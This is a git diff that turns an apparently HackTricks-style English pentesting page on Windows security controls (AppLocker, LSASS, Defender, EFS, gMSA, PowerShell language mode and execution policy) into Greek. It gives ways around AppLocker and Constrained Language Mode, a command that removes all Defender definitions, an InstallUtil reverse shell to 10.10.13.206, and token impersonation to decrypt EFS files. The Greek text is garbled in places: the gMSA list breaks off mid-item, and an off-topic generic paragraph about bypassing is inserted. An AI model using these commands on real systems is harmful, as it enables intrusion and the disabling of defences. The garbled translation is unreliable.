@@ -1,37 +1,13 @@
-# Windows Security Controls
+# Ελέγξτε την πολιτική του AppLocker
 
-<details>
+Ένας λευκός κατάλογος εφαρμογών είναι μια λίστα εγκεκριμένων λογισμικών ή εκτελέσιμων αρχείων που επιτρέπεται να υπάρχουν και να εκτελούνται σε ένα σύστημα. Ο στόχος είναι να προστατευθεί το περιβάλλον από κακόβουλο κακόβουλο λογισμικό και μη εγκεκριμένο λογισμικό που δεν συμμορφώνεται με τις συγκεκριμένες επιχειρηματικές ανάγκες μιας οργάνωσης.
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+Το [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) είναι η λύση της Microsoft για τον λευκό κατάλογο εφαρμογών και δίνει στους διαχειριστές συστήματος έλεγχο επί των εφαρμογών και των αρχείων που μπορούν να εκτελέσουν οι χρήστες. Παρέχει λεπτομερή έλεγχο επί εκτελέσιμων αρχείων, σεναρίων, αρχείων εγκατάστασης του εγκαταστάτη των Windows, DLL, εφαρμογών που έχουν συσκευαστεί και εγκαταστάτες συσκευασμένων εφαρμογών.\
+Συχνά, οι οργανισμοί αποκλείουν το cmd.exe και το PowerShell.exe και την πρόσβαση εγγραφής σε συγκεκριμένους καταλόγους, αλλά όλα αυτά μπορούν να παρακαμφθούν.
 
-Other ways to support HackTricks:
+### Έλεγχος
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
-
-</details>
-
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
-
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
-
-## AppLocker Policy
-
-An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific business needs of an organization.
-
-[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's **application whitelisting solution** and gives system administrators control over **which applications and files users can run**. It provides **granular control** over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers.\
-It is common for organizations to **block cmd.exe and PowerShell.exe** and write access to certain directories, **but this can all be bypassed**.
-
-### Check
-
-Check which files/extensions are blacklisted/whitelisted:
-
+Ελέγξτε ποια αρχεία/επεκτάσεις είναι στη μαύρη/λευκή λίστα:
 ```powershell
 Get-ApplockerPolicy -Effective -xml
 
@@ -40,64 +16,61 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 $a = Get-ApplockerPolicy -effective
 $a.rulecollections
 ```
-
-This registry path contains the configurations and policies applied by AppLocker, providing a way to review the current set of rules enforced on the system:
+Αυτή η διαδρομή του μητρώου περιέχει τις ρυθμίσεις και τις πολιτικές που εφαρμόζονται από το AppLocker, παρέχοντας έναν τρόπο για να ελεγχθεί το τρέχον σύνολο των κανόνων που επιβάλλονται στο σύστημα:
 
 - `HKLM\Software\Policies\Microsoft\Windows\SrpV2`
 
 
-### Bypass
+### Παράκαμψη
 
-* Useful **Writable folders** to bypass AppLocker Policy: If AppLocker is allowing to execute anything inside `C:\Windows\System32` or `C:\Windows` there are **writable folders** you can use to **bypass this**.
-
+* Χρήσιμοι **Φάκελοι εγγράψιμοι** για να παρακαμφθεί η πολιτική του AppLocker: Εάν το AppLocker επιτρέπει την εκτέλεση οτιδήποτε μέσα στο `C:\Windows\System32` ή `C:\Windows`, υπάρχουν **φάκελοι εγγράψιμοι** που μπορείτε να χρησιμοποιήσετε για να **παρακάμψετε αυτό**.
 ```
 C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 C:\Windows\System32\spool\drivers\color
 C:\Windows\Tasks
 C:\windows\tracing
 ```
+* Συνήθως, οι δυαδικοί αρχείοι **"LOLBAS's"** που θεωρούνται αξιόπιστοι μπορούν να χρησιμοποιηθούν για να παρακάμψουν το AppLocker.
+* Οι κακογραμμένοι κανόνες μπορούν επίσης να παρακαμφθούν.
+* Για παράδειγμα, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, μπορείτε να δημιουργήσετε έναν φάκελο με το όνομα `allowed` οπουδήποτε και θα επιτραπεί.
+* Οι οργανισμοί συχνά επικεντρώνονται στο να αποκλείουν το εκτελέσιμο `%System32%\WindowsPowerShell\v1.0\powershell.exe`, αλλά ξεχνούν τις **άλλες** [**τοποθεσίες εκτελέσιμων αρχείων PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) όπως `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ή `PowerShell_ISE.exe`.
+* Η επιβολή DLL σπάνια είναι ενεργοποιημένη λόγω του επιπρόσθετου φόρτου που μπορεί να θέσει σε ένα σύστημα και της ποσότητας δοκιμών που απαιτούνται για να διασφαλιστεί ότι τίποτα δεν θα χαλάσει. Έτσι, η χρήση των DLL ως πίσω πόρτα θα βοηθήσει στην παράκαμψη του AppLocker.
+* Μπορείτε να χρησιμοποιήσετε το [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή το [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να εκτελέσετε κώδικα Powershell σε οποιαδήποτε διεργασία και να παρακάμψετε το AppLocker. Για περισσότερες πληροφορίες, ανατρέξτε στο: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
-* Commonly **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries can be also useful to bypass AppLocker.
-* **Poorly written rules could also be bypassed**
-  * For example, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, you can create a **folder called `allowed`** anywhere and it will be allowed.
-  * Organizations also often focus on **blocking the `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, but forget about the **other** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`.
-* **DLL enforcement very rarely enabled** due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break. So using **DLLs as backdoors will help bypassing AppLocker**.
-* You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass AppLocker. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
+## Αποθήκευση διαπιστευτηρίων
 
-## Credentials Storage
+### Οδηγός Ασφαλείας Λογαριασμού (SAM)
 
-### Security Accounts Manager (SAM)
+Τα τοπικά διαπιστευτήρια βρίσκονται σε αυτό το αρχείο, με τους κωδικούς πρόσβασης να είναι κατακερματισμένοι.
 
-Local credentials are present in this file, the passwords are hashed.
+### Τοπική Αρχή Ασφαλείας (LSA) - LSASS
 
-### Local Security Authority (LSA) - LSASS
+Τα **διαπιστευτήρια** (κατακερματισμένα) αποθηκεύονται στη μνήμη αυτού του υποσυστήματος για λόγους Single Sign-On.\
+Η **LSA** διαχειρίζεται την τοπική **πολιτική ασφαλείας** (πολιτική κωδικού πρόσβασης, δικαιώματα χρηστών...) , **πιστοποίηση**, **διαπιστευτήρια πρόσβασης**...\
+Η LSA θα είναι αυτή που θα **ελέγξει** τα παρεχόμενα διαπιστευτήρια μέσα στο αρχείο **SAM** (για μια τοπική σύνδεση) και θα **επικοινωνήσει** με τον **ελεγκτή τομέα** για να πιστοποιήσει έναν χρήστη του τομέα.
 
-The **credentials** (hashed) are **saved** in the **memory** of this subsystem for Single Sign-On reasons.\
-**LSA** administrates the local **security policy** (password policy, users permissions...), **authentication**, **access tokens**...\
-LSA will be the one that will **check** for provided credentials inside the **SAM** file (for a local login) and **talk** with the **domain controller** to authenticate a domain user.
+Τα **διαπιστευτήρια** αποθηκεύονται μέσα στη διεργασία **LSASS**: εισιτήρια Kerberos, κατακερματισμένοι κωδικοί NT και LM, εύκολα αποκρυπτογραφημένοι κωδικοί πρόσβασης.
 
-The **credentials** are **saved** inside the **process LSASS**: Kerberos tickets, hashes NT and LM, easily decrypted passwords.
+### Μυστικά της LSA
 
-### LSA secrets
+Η LSA μπορεί να αποθηκεύει στον δίσκο ορισμένα διαπιστευτήρια:
 
-LSA could save in disk some credentials:
-
-* Password of the computer account of the Active Directory (unreachable domain controller).
-* Passwords of the accounts of Windows services
-* Passwords for scheduled tasks
-* More (password of IIS applications...)
+* Κωδικός του λογαριασμού υπολογιστή του Active Directory (απροσπέλαστος ελεγκτής τομέα).
+* Κωδικοί των λογαριασμών των υπηρεσιών των Windows
+* Κωδικοί για προγραμματισμένες εργασίες
+* Περισσότερα (κωδικός των εφαρμογών IIS...)
 
 ### NTDS.dit
 
-It is the database of the Active Directory. It is only present in Domain Controllers.
+Είναι η βάση δεδομένων του Active Directory. Υπάρχει μόνο στους ελεγκτές τομέα.
 
 ## Defender
 
-[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) is an Antivirus that is available in Windows 10 and Windows 11, and in versions of Windows Server. It **blocks** common pentesting tools such as **`WinPEAS`**. However, there are ways to **bypass these protections**.
+Ο [**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) είναι ένα αντιιικό πρόγραμμα που είναι διαθέσιμο στα Windows 10 και Windows 11, καθώς και σε εκδόσεις των Windows Server. Αποκλείει κοινά εργαλεία δοκιμής διείσδυσης όπως το **`WinPEAS`**. Ωστόσο, υπάρχουν τρόποι να παρακαμφθούν αυτές οι προστασίες.
 
-### Check
+### Έλεγχος
 
-To check the **status** of **Defender** you can execute the PS cmdlet **`Get-MpComputerStatus`** (check the value of **`RealTimeProtectionEnabled`** to know if it's active):
+Για να ελέγξετε την κατάσταση του **Defender**, μπορείτε να εκτελέσετε την εντολή PS **`Get-MpComputerStatus`** (ελέγξτε την τιμή του **`RealTimeProtectionEnabled`** για να μάθετε αν είναι ενεργό):
 
 <pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus
 
@@ -116,8 +89,7 @@ NISEngineVersion                : 0.0.0.0
 PSComputerName                  :
 </code></pre>
 
-To enumerate it you could also run:
-
+Για να το απαριθμήσετε, μπορείτε επίσης να εκτελέσετε:
 ```bash
 WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
 wmic /namespace:\\root\securitycenter2 path antivirusproduct
@@ -126,112 +98,99 @@ sc query windefend
 #Delete all rules of Defender (useful for machines without internet access)
 "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 ```
+## Κρυπτογραφημένο Σύστημα Αρχείων (EFS)
 
-## Encrypted File System (EFS)
+Το EFS ασφαλίζει τα αρχεία μέσω κρυπτογράφησης, χρησιμοποιώντας ένα **συμμετρικό κλειδί** γνωστό ως **Κλειδί Κρυπτογράφησης Αρχείου (FEK)**. Αυτό το κλειδί κρυπτογραφείται με το **δημόσιο κλειδί** του χρήστη και αποθηκεύεται μέσα στην εναλλακτική ροή δεδομένων $EFS του κρυπτογραφημένου αρχείου. Όταν απαιτείται αποκρυπτογράφηση, χρησιμοποιείται το αντίστοιχο **ιδιωτικό κλειδί** του ψηφιακού πιστοποιητικού του χρήστη για να αποκρυπτογραφηθεί το FEK από τη ροή $EFS. Περισσότερες λεπτομέρειες μπορούν να βρεθούν [εδώ](https://en.wikipedia.org/wiki/Encrypting_File_System).
 
-EFS secures files through encryption, utilizing a **symmetric key** known as the **File Encryption Key (FEK)**. This key is encrypted with the user's **public key** and stored within the encrypted file's $EFS **alternative data stream**. When decryption is needed, the corresponding **private key** of the user's digital certificate is used to decrypt the FEK from the $EFS stream. More details can be found [here](https://en.wikipedia.org/wiki/Encrypting_File_System).
+**Σενάρια αποκρυπτογράφησης χωρίς πρωτοβουλία του χρήστη** περιλαμβάνουν:
 
-**Decryption scenarios without user initiation** include:
+- Όταν τα αρχεία ή οι φάκελοι μεταφέρονται σε ένα αρχείο συστήματος μη-EFS, όπως το [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), αποκρυπτογραφούνται αυτόματα.
+- Τα κρυπτογραφημένα αρχεία που αποστέλλονται μέσω του πρωτοκόλλου SMB/CIFS αποκρυπτογραφούνται πριν τη μετάδοση.
 
-- When files or folders are moved to a non-EFS file system, like [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), they are automatically decrypted.
-- Encrypted files sent over the network via SMB/CIFS protocol are decrypted prior to transmission.
+Αυτή η μέθοδος κρυπτογράφησης επιτρέπει την **άμεση πρόσβαση** στα κρυπτογραφημένα αρχεία για τον ιδιοκτήτη. Ωστόσο, η απλή αλλαγή του κωδικού πρόσβασης του ιδιοκτήτη και η σύνδεση δεν επιτρέπουν την αποκρυπτογράφηση.
 
-This encryption method allows **transparent access** to encrypted files for the owner. However, simply changing the owner's password and logging in will not permit decryption.
+**Σημαντικά Στοιχεία**:
+- Το EFS χρησιμοποιεί ένα συμμετρικό FEK, το οποίο κρυπτογραφείται με το δημόσιο κλειδί του χρήστη.
+- Η αποκρυπτογράφηση χρησιμοποιεί το ιδιωτικό κλειδί του χρήστη για να αποκτήσει πρόσβαση στο FEK.
+- Η αυτόματη αποκρυπτογράφηση συμβαίνει υπό συγκεκριμένες συνθήκες, όπως η αντιγραφή σε FAT32 ή η μετάδοση μέσω δικτύου.
+- Τα κρυπτογραφημένα αρχεία είναι προσβάσιμα από τον ιδιοκτήτη χωρίς επιπλέον βήματα.
 
-**Key Takeaways**:
-- EFS uses a symmetric FEK, encrypted with the user's public key.
-- Decryption employs the user's private key to access the FEK.
-- Automatic decryption occurs under specific conditions, like copying to FAT32 or network transmission.
-- Encrypted files are accessible to the owner without additional steps.
+### Έλεγχος πληροφοριών EFS
 
-### Check EFS info
+Ελέγξτε αν ένας **χρήστης** έχει **χρησιμοποιήσει** αυτήν την **υπηρεσία** ελέγχοντας αν υπάρχει αυτή η διαδρομή: `C:\users\<όνομα_χρήστη>\appdata\roaming\Microsoft\Protect`
 
-Check if a **user** has **used** this **service** checking if this path exists:`C:\users\<username>\appdata\roaming\Microsoft\Protect`
+Ελέγξτε **ποιος** έχει **πρόσβαση** στο αρχείο χρησιμοποιώντας την εντολή `cipher /c \<αρχείο>\`
+Μπορείτε επίσης να χρησιμοποιήσετε τις εντολές `cipher /e` και `cipher /d` μέσα σε έναν φάκελο για να **κρυπτογραφήσετε** και **αποκρυπτογραφήσετε** όλα τα αρχεία
 
-Check **who** has **access** to the file using cipher /c \<file>\
-You can also use `cipher /e` and `cipher /d` inside a folder to **encrypt** and **decrypt** all the files
+### Αποκρυπτογράφηση αρχείων EFS
 
-### Decrypting EFS files
+#### Είναι ο Χρήστης Αρχής
 
-#### Being Authority System
+Αυτός ο τρόπος απαιτεί τον **χρήστη θύμα** να **εκτελεί** ένα **διαδικασία** μέσα στον υπολογιστή. Αν αυτό ισχύει, χρησιμοποιώντας μια συνεδρία `meterpreter` μπορείτε να προσομοιώσετε το διαπιστευτήριο της διεργασίας του χρήστη (`impersonate_token` από το `incognito`). Ή μπορείτε απλά να `migrate` στη διεργασία του χρήστη.
 
-This way requires the **victim user** to be **running** a **process** inside the host. If that is the case, using a `meterpreter` sessions you can impersonate the token of the process of the user (`impersonate_token` from `incognito`). Or you could just `migrate` to process of the user.
-
-#### Knowing the users password
+#### Γνωρίζοντας τον κωδικό πρόσβασης του χρήστη
 
 {% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}
 
-## Group Managed Service Accounts (gMSA)
+## Διαχειριζόμενοι Λογαριασμοί Ομάδας Υπηρεσιών (gMSA)
 
-Microsoft developed **Group Managed Service Accounts (gMSA)** to simplify the management of service accounts in IT infrastructures. Unlike traditional service accounts that often have the "**Password never expire**" setting enabled, gMSAs offer a more secure and manageable solution:
+Η Microsoft ανέπτυξε τους **Διαχειριζόμενους Λογαριασμούς Ομάδας Υπηρεσιών (gMSA)** για να απλοποιήσει τη διαχείριση των λογαριασμών υπηρεσίας στις υποδομές IT. Αντίθετα με τους παραδοσιακούς λογαριασμούς υπηρεσίας που συχνά έχουν ενεργοποιημένη τη ρύθμιση "**Ο κωδικός ποτέ δεν λήγει**", οι gMSA προσφέρουν μια πιο ασφαλή και διαχειρίσιμη λύση:
 
-- **Automatic Password Management**: gMSAs use a complex, 240-character password that automatically changes according to domain or computer policy. This process is handled by Microsoft's Key Distribution Service (KDC), eliminating the need for manual password updates.
-- **Enhanced Security**: These accounts are immune to lockouts and cannot be used for interactive logins, enhancing their security.
-- **Multiple Host Support**: gMSAs can be shared across multiple hosts, making them ideal for services running on multiple servers.
-- **Scheduled Task Capability**: Unlike managed service accounts, gMSAs support running scheduled tasks.
-- **Simplified SPN Management**: The system automatically updates the Service Principal Name (SPN) when there are changes to the computer's sAMaccount details or DNS name, simplifying SPN management.
-
-The passwords for gMSAs are stored in the LDAP property _**msDS-ManagedPassword**_ and are automatically reset every 30 days by Domain Controllers (DCs). This password, an encrypted data blob known as [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), can only be retrieved by authorized administrators and the servers on which the gMSAs are installed, ensuring a secure environment. To access this information, a secured connection such as LDAPS is required, or the connection must be authenticated with 'Sealing & Secure'.
-
-![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)
-
-You can read this password with [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
-
+- **Αυτόματη Διαχείριση Κωδικού**: Οι gMSA χρησιμοποιούν έναν πολύπλοκο κωδικό μήκους 240 χαρακτήρων που αλλάζει αυτόματα σύμφωνα με την πολιτική του τομέα ή του υπολογιστή. Αυτή η διαδικασία χειρίζεται από την Υπηρεσία Διανομής Κλειδιών (KDC) της Microsoft, εξαλείφοντας την ανάγκη για χειροκίνητες ενημερώσεις κωδικού.
+- **Ενισχυμένη Ασφάλεια**: Αυτοί οι λογαριασμοί είναι ανθεκτικοί στο κλείδωμα και δεν μπορούν να χρησιμοποιηθούν για διαδραστικές συνδέσεις, ενισχύοντας την ασφάλειά τους.
+- **Υποστήριξη Πολλαπλών Υπολογιστών**: Οι gMSA μπορούν να κοινοποιηθούν σε πολλούς υπολογιστές, καθιστώντας τους ιδανικούς για υπηρεσίες που λειτουργούν σε πολλούς διακομιστές.
+- **
 ```
 /GMSAPasswordReader --AccountName jkohler
 ```
+**[Βρείτε περισσότερες πληροφορίες σε αυτήν την ανάρτηση](https://cube0x0.github.io/Relaying-for-gMSA/)**
 
-**[Find more info in this post](https://cube0x0.github.io/Relaying-for-gMSA/)**
-
-Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.
+Επίσης, ελέγξτε αυτήν την [ιστοσελίδα](https://cube0x0.github.io/Relaying-for-gMSA/) σχετικά με το πώς να εκτελέσετε μια επίθεση **NTLM relay** για να **διαβάσετε** τον **κωδικό πρόσβασης** του **gMSA**.
 
 ## LAPS
 
-The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), enables the management of local Administrator passwords. These passwords, which are **randomized**, unique, and **regularly changed**, are stored centrally in Active Directory. Access to these passwords is restricted through ACLs to authorized users. With sufficient permissions granted, the ability to read local admin passwords is provided.
+Η **Λύση Τοπικού Διαχειριστή Κωδικού Πρόσβασης (LAPS)**, διαθέσιμη για λήψη από την [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), επιτρέπει τη διαχείριση των τοπικών κωδικών πρόσβασης του διαχειριστή. Αυτοί οι κωδικοί πρόσβασης, οι οποίοι είναι **τυχαίοι**, μοναδικοί και **αλλάζουν τακτικά**, αποθηκεύονται κεντρικά στο Active Directory. Η πρόσβαση σε αυτούς τους κωδικούς περιορίζεται μέσω των ACLs σε εξουσιοδοτημένους χρήστες. Με την απονομή επαρκών δικαιωμάτων, παρέχεται η δυνατότητα ανάγνωσης των τοπικών κωδικών πρόσβασης.
 
 {% content-ref url="active-directory-methodology/laps.md" %}
 [laps.md](active-directory-methodology/laps.md)
 {% endcontent-ref %}
 
-## PS Constrained Language Mode
+## Λειτουργία Περιορισμένης Γλώσσας PowerShell
 
-PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **locks down many of the features** needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more.
+Η [**Λειτουργία Περιορισμένης Γλώσσας PowerShell**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **περιορίζει πολλές από τις λειτουργίες** που απαιτούνται για την αποτελεσματική χρήση του PowerShell, όπως ο περιορισμός των COM αντικειμένων, η επιτροπή μόνο εγκεκριμένων τύπων .NET, οι ροές εργασίας βασισμένες σε XAML, οι κλάσεις PowerShell και άλλα.
 
-### **Check**
-
+### **Έλεγχος**
 ```powershell
 $ExecutionContext.SessionState.LanguageMode
 #Values could be: FullLanguage or ConstrainedLanguage
 ```
+### Παράκαμψη
 
-### Bypass
+Η παράκαμψη είναι μια τεχνική που χρησιμοποιείται για να παρακάμψει τις ασφαλείς μηχανισμούς πιστοποίησης και πρόσβασης σε ένα σύστημα. Με την παράκαμψη, ο χάκερ μπορεί να αποκτήσει πρόσβαση σε προνομιακές λειτουργίες ή πληροφορίες χωρίς την απαιτούμενη πιστοποίηση.
 
+Υπάρχουν διάφορες τεχνικές παράκαμψης που μπορούν να χρησιμοποιηθούν, όπως η εκμετάλλευση ευπαθειών στο λογισμικό, η χρήση κακόβουλου λογισμικού ή η απάτη των χρηστών για να αποκτήσουν πρόσβαση σε πιστοποιητικά ή διαπιστευτήρια.
+
+Οι χάκερ μπορούν επίσης να χρησιμοποιήσουν τεχνικές παράκαμψης για να παρακάμψουν τον έλεγχο του χρήστη (UAC) ή το σύστημα αρχείων κρυπτογράφησης (EFS) σε ένα σύστημα Windows. Αυτό τους επιτρέπει να αποκτήσουν πρόσβαση σε προνομιακές λειτουργίες ή κρυπτογραφημένα αρχεία χωρίς την απαιτούμενη πιστοποίηση ή κλειδί αποκρυπτογράφησης.
 ```powershell
 #Easy bypass
 Powershell -version 2
 ```
+Στα τρέχοντα Windows αυτή η παράκαμψη δεν θα λειτουργήσει, αλλά μπορείτε να χρησιμοποιήσετε το [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
+**Για να το μεταγλωττίσετε, μπορεί να χρειαστεί να** _**Προσθέσετε μια Αναφορά**_ -> _Περιήγηση_ -> _Περιήγηση_ -> προσθέστε `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` και **αλλάξτε το έργο σε .Net4.5**.
 
-In current Windows that Bypass won't work but you can use[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
-**To compile it you may need** **to** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> add `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` and **change the project to .Net4.5**.
-
-#### Direct bypass:
-
+#### Άμεση παράκαμψη:
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
 ```
-
-#### Reverse shell:
-
+#### Αντίστροφη κέλυφος:
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
+Μπορείτε να χρησιμοποιήσετε το [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή το [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να εκτελέσετε κώδικα Powershell σε οποιαδήποτε διεργασία και να παρακάμψετε την περιορισμένη λειτουργία. Για περισσότερες πληροφορίες ανατρέξτε στο: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
-You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass the constrained mode. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
+## Πολιτική Εκτέλεσης PS
 
-## PS Execution Policy
-
-By default it is set to **restricted.** Main ways to bypass this policy:
-
+Από προεπιλογή είναι ορισμένη σε **περιορισμένη**. Οι κύριοι τρόποι για να παρακάμψετε αυτήν την πολιτική είναι:
 ```powershell
 1º Just copy and paste inside the interactive PS console
 2º Read en Exec
@@ -251,33 +210,32 @@ Powershell -command "Write-Host 'My voice is my passport, verify me.'"
 9º Use EncodeCommand
 $command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
 ```
+Περισσότερες πληροφορίες μπορούν να βρεθούν [εδώ](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
 
-More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
+## Διεπαφή Υποστήριξης Παρόχου Ασφάλειας (SSPI)
 
-## Security Support Provider Interface (SSPI)
+Είναι η διεπαφή προγραμματισμού εφαρμογών που μπορεί να χρησιμοποιηθεί για την πιστοποίηση των χρηστών.
 
-Is the API that can be use to authenticate users.
+Η SSPI έχει τον ρόλο να βρει το κατάλληλο πρωτόκολλο για δύο μηχανές που θέλουν να επικοινωνήσουν. Η προτιμώμενη μέθοδος για αυτό είναι το Kerberos. Στη συνέχεια, η SSPI θα διαπραγματευτεί ποιο πρωτόκολλο πιστοποίησης θα χρησιμοποιηθεί. Αυτά τα πρωτόκολλα πιστοποίησης ονομάζονται Πάροχοι Υποστήριξης Ασφάλειας (SSP) και βρίσκονται μέσα σε κάθε μηχάνημα Windows σε μορφή DLL και και οι δύο μηχανές πρέπει να υποστηρίζουν τον ίδιο πάροχο για να μπορούν να επικοινωνήσουν.
 
-The SSPI will be in charge of finding the adequate protocol for two machines that want to communicate. The preferred method for this is Kerberos. Then the SSPI will negotiate which authentication protocol will be used, these authentication protocols are called Security Support Provider (SSP), are located inside each Windows machine in the form of a DLL and both machines must support the same to be able to communicate.
+### Κύριοι Πάροχοι Υποστήριξης Ασφάλειας (SSP)
 
-### Main SSPs
+* **Kerberos**: Ο προτιμώμενος
+* %windir%\Windows\System32\kerberos.dll
+* **NTLMv1** και **NTLMv2**: Λόγω συμβατότητας
+* %windir%\Windows\System32\msv1\_0.dll
+* **Digest**: Διακομιστές ιστού και LDAP, κωδικός πρόσβασης σε μορφή κατακερματισμένου MD5
+* %windir%\Windows\System32\Wdigest.dll
+* **Schannel**: SSL και TLS
+* %windir%\Windows\System32\Schannel.dll
+* **Negotiate**: Χρησιμοποιείται για τη διαπραγμάτευση του πρωτοκόλλου που θα χρησιμοποιηθεί (Kerberos ή NTLM, με το Kerberos να είναι το προεπιλεγμένο)
+* %windir%\Windows\System32\lsasrv.dll
 
-* **Kerberos**: The preferred one
-  * %windir%\Windows\System32\kerberos.dll
-* **NTLMv1** and **NTLMv2**: Compatibility reasons
-  * %windir%\Windows\System32\msv1\_0.dll
-* **Digest**: Web servers and LDAP, password in form of a MD5 hash
-  * %windir%\Windows\System32\Wdigest.dll
-* **Schannel**: SSL and TLS
-  * %windir%\Windows\System32\Schannel.dll
-* **Negotiate**: It is used to negotiate the protocol to use (Kerberos or NTLM being Kerberos the default one)
-  * %windir%\Windows\System32\lsasrv.dll
+#### Η διαπραγμάτευση μπορεί να προσφέρει πολλές μεθόδους ή μόνο μία.
 
-#### The negotiation could offer several methods or only one.
+## UAC - Έλεγχος Χρήστη Λογαριασμού
 
